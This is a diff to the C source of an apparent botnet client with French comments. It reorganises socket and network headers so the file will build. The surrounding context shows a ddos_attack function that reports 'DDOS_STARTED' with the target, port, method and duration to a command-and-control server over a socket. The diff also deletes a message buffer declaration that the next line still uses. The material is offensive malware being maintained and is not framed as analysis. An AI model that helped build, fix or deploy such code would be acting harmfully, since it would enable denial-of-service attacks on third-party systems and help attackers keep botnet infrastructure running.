@@ -8,27 +8,36 @@
 #define MAX_PACKET_SIZE (5 * 1024 * 1024)  // 5MB max
 #define MIN_PACKET_SIZE (1024)             // 1KB min
 
+/* Définition pour éviter l'erreur asm/socket.h */
+#ifndef SOCK_NONBLOCK
+#define SOCK_NONBLOCK 04000
+#endif
+
 /* Headers système */
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <sys/types.h>
-#include <sys/socket.h>
 #include <sys/time.h>
 #include <sys/wait.h>
 #include <netinet/in.h>
-#include <netinet/ip.h>
-#include <netinet/tcp.h>
-#include <netinet/udp.h>
 #include <arpa/inet.h>
 #include <time.h>
 #include <errno.h>
 #include <fcntl.h>
 #include <signal.h>
-#include <time.h>
-#include <fcntl.h>
-#include <sys/wait.h>
+
+/* Socket header */
+#include <sys/socket.h>
+
+/* Headers optionnels (si disponibles) */
+#ifdef __linux__
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
+#endif
+
 #include <dirent.h>
 
 // Déclarations des fonctions
@@ -254,7 +263,6 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
     }
     
     // Informer le serveur C2 du début de l'attaque
-    char message[BUFFER_SIZE];
     snprintf(message, sizeof(message), "DDOS_STARTED|%s:%d|%s|%d seconds", target, port, method, duration);
     send(c2_socket, message, strlen(message), 0);
     
